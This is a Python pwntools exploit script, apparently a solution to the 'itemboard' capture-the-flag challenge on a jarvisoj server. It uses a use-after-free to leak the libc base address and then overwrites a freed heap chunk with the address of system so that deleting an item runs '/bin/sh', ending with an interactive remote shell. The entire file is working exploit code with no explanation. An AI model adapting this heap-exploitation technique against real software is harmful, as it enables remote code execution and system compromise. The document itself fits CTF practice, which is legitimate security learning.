#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
#io = process('./itemboard', env = {'LD_PRELOAD':'./libc-2.19.so'})
# gdb.attach(io, 'bpie 0xf68')
io = remote('pwn2.jarvisoj.com', 9887)
elf = ELF('./itemboard')
libc = ELF('./libc-2.19.so')

main_arena = 0x3be760
sys_libc = libc.sym['system']
binsh = libc.search('/bin/sh').next()

def addItem(name, lenth, description):
    io.sendlineafter('choose:\n', '1')
    io.sendlineafter('name?\n', name)
    io.sendlineafter('len?\n', str(lenth))
    io.sendlineafter('tion?\n', description)

def deleteItem(item):
    io.sendlineafter('choose:\n', '4')
    io.sendlineafter('item?\n', str(item))


def show(item):
    io.sendlineafter('choose:\n', '3')
    io.sendlineafter('item?\n', str(item))

if __name__ == '__main__':
    addItem('aaaa', 128, 'AAAA')
    addItem('bbbb', 128, 'BBBB')
    deleteItem(0)
    show(0)
    io.recvuntil('tion:')
    libc_base = u64(io.recvuntil('\x7f').ljust(8, '\x00'))
    libc_base = libc_base - 88 - main_arena

    sys_addr = libc_base + sys_libc
    bin_addr = libc_base + binsh
    success('libc_base -> {:#x}'.format(libc_base))
    success('system -> {:#x}'.format(sys_addr))
    raw_input('ok?')

    addItem('cccc', 64, 'CCCC')
    addItem('dddd', 64, 'DDDD')
    deleteItem(2)
    deleteItem(3)

    addItem('bingo!', 24, '/bin/sh;' + 'EEEEEEEE' + p64(sys_addr))
    deleteItem(0)

    io.interactive()
    io.close()
